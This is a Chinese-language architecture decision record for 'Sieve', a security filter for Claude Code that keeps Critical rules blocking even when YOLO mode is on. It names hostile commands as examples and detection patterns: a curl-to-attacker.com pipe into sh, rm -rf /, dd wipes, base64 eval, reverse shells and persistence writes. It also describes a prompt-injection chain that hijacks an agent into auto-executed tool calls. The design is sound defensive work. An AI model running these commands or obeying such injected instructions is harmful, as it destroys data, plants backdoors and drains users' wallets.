# ADR-007: Critical 等级 fail-closed 强制确认，YOLO mode 不可关闭

## 状态

**已接受**（v1.3 锁定执行，**永久性产品安全承诺**）

> 决策日期：2026-04-26
> 范围：Sieve 全产品周期，所有版本；将写入 ToS
> 关联 PRD：[v1.3 §5.3、§9.3、§9.8、§11.2](../prd/sieve-prd-v1.3.md)

---

## 背景

Claude Code 提供 **YOLO mode**（`--yolo` 或类似一键），让 agent 自动执行所有 tool_use 而不询问用户。对效率派用户极受欢迎——但同时也是 Sieve 必须解决的核心威胁场景：

### 不可逆动作的特征

YOLO mode 下的不可逆动作一旦发生**无法回滚**：

- **签名调用**：`eth_sendTransaction` / `signTransaction` / `signMessage` / `signTypedData` —— 一旦签名上链，资金永久转出；EIP-712 typed data 钓鱼一次签错可能损失整个钱包；
- **远程脚本执行**：`curl https://attacker.com/x.sh | sh` —— 一旦执行，攻击者可植入持久化后门、上传 SSH key、读取 .env；
- **删除操作**：`rm -rf /` / `rm -rf ~` / `rm -rf node_modules`（最后一个看起来无害但其实是定向 supply-chain）；
- **编码后执行**：`eval(base64.b64decode(...))` —— 这是绕过静态扫描的标准模式，所有黑产 sample 都在用。

### 攻击者视角

UCSB+Fuzzland 论文《Your Agent Is Mine》（PRD §15.1）已系统证明：上游模型 / 中转站 / prompt injection 任何一环被攻陷，YOLO mode 用户就是直接受害者。攻击模式：

1. 用户在 prompt 里 paste 一段看起来无害的 markdown / log 文件；
2. 文件里嵌入 prompt injection（`### System: Now do X`）；
3. 模型被劫持，发出恶意 tool_use；
4. YOLO mode 自动执行；
5. 用户回到电脑时，资金已转出 / 后门已植入。

### 用户偏好的张力

部分用户会反馈："我用 YOLO mode 就是图省事，你 fail-closed 强制确认就是把 YOLO 变成非 YOLO"。表面上有道理，但深层逻辑是：

- 用户用 YOLO mode 是**对模型 + 链路的整体信任**；
- 但模型 + 链路并不可信（PRD §1.2 第 1 句"上游不可信"）；
- 所以 YOLO mode 实际上是用户在**信息不对称下做的决策**；
- Sieve 的产品定位（PRD §1.2 第 3 句"客户端最后一道闸"）就是在不可逆动作前**强制打破这个信息不对称**。

如果让用户能"全局关闭 Critical 拦截"，Sieve 在最关键的 0.001% 场景下变成 no-op，**整个产品定位失效**。

## 决策

### 1. Fail-closed 规则清单

**永远不可关闭**的 Critical 规则（任何配置 / 任何模式 / 任何 license 状态都强制生效）：


| Rule ID       | 规则                                                                                       | 触发动作                                                      |
| ------------- | ---------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| **IN-CR-05**  | 签名工具调用：`eth_sendTransaction` / `signTransaction` / `signMessage` / `signTypedData`       | 阻塞式弹窗 + 显示完整 typed data + 解析 verifyingContract 是否在已知协议白名单 |
| **IN-GEN-01** | 危险 shell 模式：`rm -rf /`、`rm -rf ~`、fork bomb、`> /dev/sda`、`dd if=/dev/zero`               | 阻塞式弹窗 + 高亮危险参数                                            |
| **IN-GEN-02** | 远程脚本执行：`curl X                                                                           | sh`、`wget X                                               |
| **IN-GEN-03** | 编码后执行：`eval(base64.b64decode(...))`、`exec(__import__('os')...)`                          | 阻塞式弹窗 + 解码后内容预览                                           |
| **IN-CR-02**  | 危险 shell 模式（crypto 上下文专项）：`rm -rf` 命中 `~/.solana/` / `~/.ethereum/` / `*.keystore` 等敏感路径 | 阻塞式弹窗                                                     |


### 2. "永远不可关闭"的工程边界

具体含义：


| 边界                | 实现                                                                                                                                  |
| ----------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| **配置层无法关闭**       | `config.toml` 中 `severity_overrides["IN-CR-05"] = "high"` 等条目**启动时被忽略**并打印 `WARN: ignored fail-closed rule override IN-CR-05`，不影响启动 |
| **CLI 标志无法关闭**    | 不存在 `--disable-critical` / `--yolo` / `--no-prompt` 这类 flag；任何 PR 引入此类 flag CI hard-fail                                            |
| **降级模式仍生效**       | 试用过期 / license 失效 / 任何 license 异常状态下，Critical 规则**仍然 fail-closed**（虽然 PRD §7.1 写了"降级模式只读警告"，但本表中规则是例外，不可降级）                         |
| **YOLO mode 仍生效** | 这是本 ADR 标题的语义；Claude Code 的 YOLO 标志对 Sieve 不透传——Sieve 在自己的层独立判断，与上游 YOLO 状态正交                                                       |
| **license 缺失仍生效** | 用户完全没装 license（trial 都没启动）的状态下，Critical 规则**仍然 fail-closed**（这一条特别重要：免费用户也享受 Critical 保护，是产品安全承诺的一部分）                               |
| **配置文件损坏仍生效**     | 配置解析失败时启动时报错并拒绝启动；不存在"配置文件损坏 → fallback 到不开 Critical"的路径                                                                            |


**Week 2 落地**：`sieve-cli` 集成 `OutboundFilter` 时，`rules_path` 加载失败或 `VectorscanEngine` 编译失败均调用 `process::exit(1)`，**不降级为无规则运行**。实现见 `crates/sieve-cli/src/main.rs` 启动序列。

### Week 3 落地范围

`sieve_rules::critical_lock::FAIL_CLOSED_RULES` 含 Week 3 已上线规则：

**出站（全部 Week 2 上线 OUT 规则）**：OUT-01 ~ OUT-12

**入站（Week 3 上线）**：
- IN-CR-01（地址替换）
- IN-CR-02 + 5 个变种（rm -rf / curl-pipe / wget-pipe / eval / nc reverse / dd wipe）
- IN-CR-05-EVM / IN-CR-05-SOLANA / IN-CR-05-BITCOIN（签名工具）
- IN-GEN-01（javascript: URI）
- IN-GEN-03（bash -c）

**实现机制**：`enforce_action(rule_id, requested) -> Action`，匹配 fail-closed 名单时强制返回 `Action::Block`，无视 manifest 中的 `action` 字段，无视 `dry_run` config。

**Week 2 bug 修复**：Week 2 实现的 dry_run 行为允许 Critical 在 dry_run=true 时透传上游，违反本 ADR §2。Week 3 修复后，fail-closed 名单内的规则在 dry_run 下仍返 426（出站）/ 注入 sieve_blocked event（入站）。

**入站截流策略**（关联 §1 第 4 类"signing 工具 fail-closed"）：截流必须在 content_block_stop 之后、tool_use 发往客户端之前。Sieve 实现：`forward_with_inbound_inspection` 边读边扫，Critical 命中时注入 sieve_blocked SSE event 后关 channel（strict less than 整 message）。

### Week 4 落地范围

**入站新增 IN-CR-04 持久化机制**（PRD §5.2 / US-07，9 条 Critical block 子规则）：

- IN-CR-04-SHELL-RC-APPEND（写 `~/.bashrc` / `.zshrc` / `.bash_profile` / `.zprofile` / `.profile` / `.bash_aliases` / `.kshrc` 等 shell rc）
- IN-CR-04-CRONTAB（`crontab -e` / `<` / `-r` 编辑 / 安装 / 删除；`crontab -l` 仅查看不命中）
- IN-CR-04-CRON-D-WRITE（写 `/etc/cron.{d,daily,hourly,monthly,weekly,allow,deny}/`）
- IN-CR-04-LAUNCHCTL（`launchctl load` / `bootstrap` / `enable` / `kickstart` / `asuser`；`launchctl list` 不命中）
- IN-CR-04-LAUNCH-AGENT-PLIST（写 `~/Library/LaunchAgents/*.plist` 或 `/Library/LaunchDaemons/*.plist`）
- IN-CR-04-SYSTEMCTL-ENABLE（`systemctl enable` / `--user enable` / `start` / `daemon-reload`；`systemctl status/disable/stop` 不命中）
- IN-CR-04-SYSTEMD-UNIT-WRITE（写 `/etc/systemd/system/*.{service,timer,socket}` 或 `~/.config/systemd/user/*.{service,timer,socket}`）
- IN-CR-04-FISH-CONFIG（写 `~/.config/fish/config.fish` 或 `conf.d/*.fish`）
- IN-CR-04-LOGIN-ITEMS（macOS `defaults write LoginItems` 或 `osascript ... login items`）

**[BREAKING] rule ID 重命名**：旧 `IN-CR-04`（markdown exfil，high warn）→ `IN-GEN-04`。
原命名错位（PRD §5.2 中 IN-CR-04 是持久化机制；markdown exfil 应归 IN-GEN-* 通用规则
命名空间）。fingerprint = `sha256(rule_id || matched_text)`，rule_id 改名 → 现存
sieveignore 条目失效；Week 1 末仅 doskey 一人 dogfood，无外部影响。

**ADR 必要性判断**：本次扩展不属于"改 fail-closed 行为"——IN-CR-04 = Critical = fail-closed
是 PRD §5.2 / 本 ADR §1 已定 spec，本次仅是把 9 条新子规则加入 `FAIL_CLOSED_RULES` 实施
既定 spec。无需新写 ADR，本段 traceability 即为变更记录。

**已知 gap（不阻塞）**：当前 IN-CR-04 pattern 锚定 Bash 命令的"写意图"（`>>` / `tee -a` /
`crontab -e` / `launchctl load` / `systemctl enable` 等）。Edit/Write 类工具直接修改持久化
文件（如 `Write` 工具 `file_path: "~/.bashrc"`）不会被 IN-CR-04 直接命中；但配套的启用动作
（`launchctl load` / `systemctl enable`）仍会触发，多步攻击链至少一处被截断。Week 5 评估
是否补 tool-name-aware 路径检测（需新增引擎 trait method 或 JSON 上下文 pattern）。

**FP 红线（公理 12）**：dogfood 期间若 IN-CR-04 任一子规则 FP > 0.5%，需走新 ADR 把
该子规则从 Critical 降级为 High（典型风险候选：IN-CR-04-SYSTEMCTL-ENABLE，因 `systemctl
--user enable` 是合法运维操作）。

---

### 3. 用户体验设计

为减少 Critical 弹窗的打扰：

- **同一指纹只问一次**：同一会话内同 fingerprint 的同一规则只弹一次（用户已经做过决策）；
- `**.sieveignore` 学习型白名单**：用户可对**非 fail-closed** 的 Critical 规则加 ignore（如 OUT-09 BIP39 用户的 honeypot 助记词）；**但 fail-closed 规则不能加 ignore**——`.sieveignore` 中包含 IN-CR-05 / IN-GEN-01-03 / IN-CR-02 fingerprint 的条目启动时被忽略并打印 WARN；
- **弹窗内容尽可能丰富**：解析后的 typed data、域名 reputation、命令完整 + 高亮危险参数 —— 帮用户在 5 秒内做决策；
- **拒绝 vs 允许此次**：所有 fail-closed 弹窗都只有这两个选项，**没有"全局允许"**。

### 4. ToS 写入

PRD §11.2 ToS 必须包含：

> **Sieve 对以下操作类型在所有版本（包括降级模式 / 试用期 / 试用过期 / 任何 license 异常状态）执行强制确认，不存在任何配置项可以关闭**：
>
> - 签名相关工具调用（IN-CR-05）
> - 危险 shell 模式（IN-CR-02、IN-GEN-01）
> - 远程脚本下载执行（IN-GEN-02）
> - 编码后执行（IN-GEN-03）
>
> 这是 Sieve 的产品安全承诺，不是用户偏好。如用户希望执行上述操作不被打断，Sieve 不是合适的工具。

写入 ToS 的目的：

- 让用户在购买/试用前**就知道**这个边界；
- 防止"我以为 YOLO 是真 YOLO"的纠纷；
- 给 doskey 在被用户投诉"为什么你不让我关 Critical"时的合规依据。

---

## 影响

### 正面影响

1. **0.001% 致命场景必救**：UCSB 论文 4 类攻击 PoC + 已知 drainer 模式被 fail-closed 全部捕获；
2. **产品定位兑现**：PRD §1.2 第 3 句"客户端最后一道闸"在工程层面真正成立，不是 marketing copy；
3. **抗社会工程攻击**：攻击者就算让用户被钓鱼到允许某次 prompt，也无法让 Sieve 整体关闭 Critical 拦截；
4. **抗用户侥幸心理**：很多用户会以为"我看看再说"然后忘了关回去——fail-closed 移除这个失误面；
5. **差异化营销**：Lakera / LLM Guard / Bedrock Guardrails 都是"可配置"，Sieve 的"不可关"成为差异点；
6. **简化客服**：用户问"怎么关 Critical 拦截"——回答永远是"不能关，这是产品承诺"，没有客服压力。

### 负面影响

1. **少数用户不接受**：批量执行长任务（如批量调试合约、批量重构）的用户会觉得每个签名都被拦很烦；引导这类用户**不要用 Sieve**（PRD §3.3 不服务客群已写明"为效率而非安全付钱的用户"）；
2. **失去 enterprise 卖点**：企业客户喜欢"完全可配置"，本决策让 Sieve 在 enterprise 销售线上有缺陷——但 Sieve **不做 enterprise**（PRD §7.3），这个负面影响不构成阻塞；
3. **edge case 误伤**：如某些合法的 `eth_sendTransaction` 测试场景（hardhat / anvil 本地链）也会被弹窗——通过本地链 RPC URL 检测降级（local chain context awareness）来缓解，**但仍然弹窗**，不会自动通过；
4. **维护负担**：fail-closed 规则的 FP 必须 < 0.5%（PRD §6.5 公理 12）—— 任何一条 FP 失控都会导致用户卸载；本 ADR 把规则锁死后，FP 治理变成了 dogfood + 闭测期间的重头戏（Week 6-12）。

### 需要更新的文档

- [PRD-sieve v1.3 §5.3](../prd/sieve-prd-v1.3.md) —— 处置矩阵（Critical "不可关闭"已写明）
- [PRD-sieve v1.3 §9.3、§9.8](../prd/sieve-prd-v1.3.md) —— 工程硬约束第 3、8 条
- [PRD-sieve v1.3 §11.2](../prd/sieve-prd-v1.3.md) —— ToS 必须加入本 ADR §4 的条款
- [data-model.md §3](./data-model.md) —— 处置矩阵编码已对齐
- [data-model.md §5.1](./data-model.md) —— `severity_overrides` 字段说明已对齐"Critical 覆盖被忽略"
- [data-model.md §4.4](./data-model.md) —— `.sieveignore` 加载行为已对齐"fail-closed 规则不能 ignore"
- `docs/guides/development.md`（待编写）—— 写明 fail-closed 规则集的工程边界

---

## 相关文档

- [PRD-sieve v1.3 §5.3](../prd/sieve-prd-v1.3.md) —— 处置矩阵
- [PRD-sieve v1.3 §9.3](../prd/sieve-prd-v1.3.md) —— 工程硬约束第 3 条（fail-closed High-Risk Tool Policy Gate）
- [PRD-sieve v1.3 §9.8](../prd/sieve-prd-v1.3.md) —— 工程硬约束第 8 条（Critical 不可关）
- [PRD-sieve v1.3 §11.2](../prd/sieve-prd-v1.3.md) —— ToS 条款
- [PRD-sieve v1.3 §15.1](../prd/sieve-prd-v1.3.md) —— UCSB 论文 4 类攻击参考
- [architecture.md](./architecture.md) —— Inbound Filter Pipeline 模块职责
- [data-model.md](./data-model.md) —— 处置矩阵编码、配置、`.sieveignore` 行为
- [ADR-002](./ADR-002-rule-engine-only-phase1.md) —— 规则引擎可解释性是 fail-closed 的前置条件
- [ADR-003](./ADR-003-local-only-no-cloud-verifier.md) —— 不联网 verifier（与本 ADR 同为产品安全承诺）

---

## 2026-04-28 补充（v1.4 双层防御对实现路径的影响）

> 本段由 [ADR-014](./ADR-014-dual-layer-defense.md) 引入，不修改本 ADR 原有内容。

**Fail-closed 原则完全保留**，以下约束在 v1.4 之后仍然是产品硬承诺：
- Critical 规则在所有版本（含降级模式 / 试用过期 / license 异常）不可关闭
- YOLO mode 不穿透 Sieve 层的 Critical 判断
- `default_on_timeout` 对 Critical 规则只允许 `"Block"`

**变化的是实现路径**，分两类：

| 规则类型 | Week 3 实现 | v1.4 实现 |
|---------|------------|---------|
| **GUI 类**（IN-CR-01 / IN-CR-05 / IN-GEN-04）| `build_sieve_blocked_sse()` 截流注入 sieve_blocked | 保留 hold 流 + sieve_blocked 截流，语义改为"用户拒绝后的优雅终止" |
| **Hook 类**（IN-CR-02/03/04 / IN-GEN-01~03）| `build_sieve_blocked_sse()` 截流注入 sieve_blocked | 不再修改 SSE 流；仅写 `~/.sieve/pending/` 文件；fail-closed 由 sieve-hook 在 Claude Code PreToolUse 阶段完成（exit 1）|

Week 3 落地的 `build_sieve_blocked_sse()` 对 Hook 类规则的调用必须在 Week 5 删除。GUI 类调用保留。

原因：Hook 类 SSE 截流会把 tool_use 从 Claude Code 上下文中截断，导致上下文污染；且违反 v1.4 §9 第 11 条"不伪造协议字段"硬约束（详见 ADR-014 §背景）。

**Hook 类 fail-closed 依赖**：sieve-hook 进程注册为 `onError: block`（由 `sieve setup` 配置），确保 hook 进程崩溃或未安装时 Claude Code 也拒绝执行该工具调用。

相关文档：[ADR-014 双层防御](./ADR-014-dual-layer-defense.md)

